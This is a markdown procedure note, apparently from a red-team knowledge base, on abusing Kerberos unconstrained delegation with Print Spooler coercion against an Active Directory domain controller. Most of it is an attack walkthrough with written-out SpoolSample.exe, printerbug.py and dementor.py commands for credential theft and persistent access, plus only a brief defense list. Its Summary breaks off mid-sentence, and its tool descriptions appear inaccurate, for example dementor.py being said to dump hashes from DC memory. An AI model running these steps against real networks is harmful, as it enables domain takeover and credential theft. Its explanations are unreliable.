---
id: e36b0acb-343a-47e8-bcc7-e1bfe59be6e9
name: Kerberos Unconstrained Delegation with SpoolService Abuse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.556116+00:00'
updated_at: '2023-04-10T20:26:11.188849+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Force a connect back from the DC]]'
- '[[Kerberos Unconstrained Delegation]]'
- '[[SpoolService Abuse with Unconstrained Delegation]]'
commands:
- '[[Run dementor.py to dump hashes]]'
- '[[Run printerbug.py to perform Kerberos Relay Attack]]'
- '[[Run SpoolSample.exe on target and unconstrained server]]'
---

# Kerberos Unconstrained Delegation with SpoolService Abuse

## Summary

Kerberos Unconstrained Delegation is a feature in Active Directory that allows a user to delegate their authentication to a service. This feature is often used to allow a user to access resources on a remote server without having to provide their credentials. However, if a service is misconfigured 

## Description

# Description

Kerberos Unconstrained Delegation is a feature in Active Directory that allows a user to delegate their authentication to a service. This feature is often used to allow a user to access resources on a remote server without having to provide their credentials. However, if a service is misconfigured and allows unconstrained delegation, an attacker can abuse this feature to gain access to sensitive resources. In this attack, an attacker first gains access to a domain user account, then uses the SpoolService to abuse unconstrained delegation to gain access to the domain controller. The attacker can then force a connect back from the DC to establish persistence and maintain access to the network.

This attack is technically complex and requires a deep understanding of Active Directory and Kerberos. However, if successful, it can provide an attacker with persistent access to the network and sensitive resources. From a business perspective, this attack can result in data theft, intellectual property theft, and reputational damage.

 

## Requirements

1. Domain user account access

1. Access to the SpoolService

1. Knowledge of Active Directory and Kerberos

 

## Defense

1. Disable unconstrained delegation where possible

1. Monitor for unusual activity related to Kerberos authentication

1. Implement network segmentation to limit the impact of a successful attack

 

## Objectives

1. Gain access to sensitive resources on the network

1. Establish persistent access to the network

 

# Instructions

1. To exploit unconstrained delegation, run the following commands:
1. Run the SpoolSample.exe tool with the victim DC name and the name of the computer with unconstrained delegation.
2. Run the printerbug.py tool with the domain/username:password and the victim DC name.
3. Run the dementor.py tool with the domain name, username, password, and the name of the computer with unconstrained delegation and the victim DC name.

 



**Code**: [[# From https://github.com/leechristensen/SpoolSamp]]



> The SpoolSample.exe tool is used to exploit the Print Spooler service on the victim DC by creating a fake printer and forcing the DC to authenticate to the attacker's machine. The printerbug.py tool is used to exploit the Kerberos authentication process by relaying the authentication request to the victim DC. The dementor.py tool is used to dump credentials from the victim DC's memory. All of these tools take advantage of the unconstrained delegation vulnerability to gain access to sensitive data and/or escalate privileges.



**Command** ([[Run SpoolSample.exe on target and unconstrained server]]):

```bash
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
```





**Command** ([[Run printerbug.py to perform Kerberos Relay Attack]]):

```bash
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
```





**Command** ([[Run dementor.py to dump hashes]]):

```bash
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]

## Commands Used

- [[Run dementor.py to dump hashes]]
- [[Run printerbug.py to perform Kerberos Relay Attack]]
- [[Run SpoolSample.exe on target and unconstrained server]]

## Tags

- [[Active Directory Attacks]]
- [[Force a connect back from the DC]]
- [[Kerberos Unconstrained Delegation]]
- [[SpoolService Abuse with Unconstrained Delegation]]


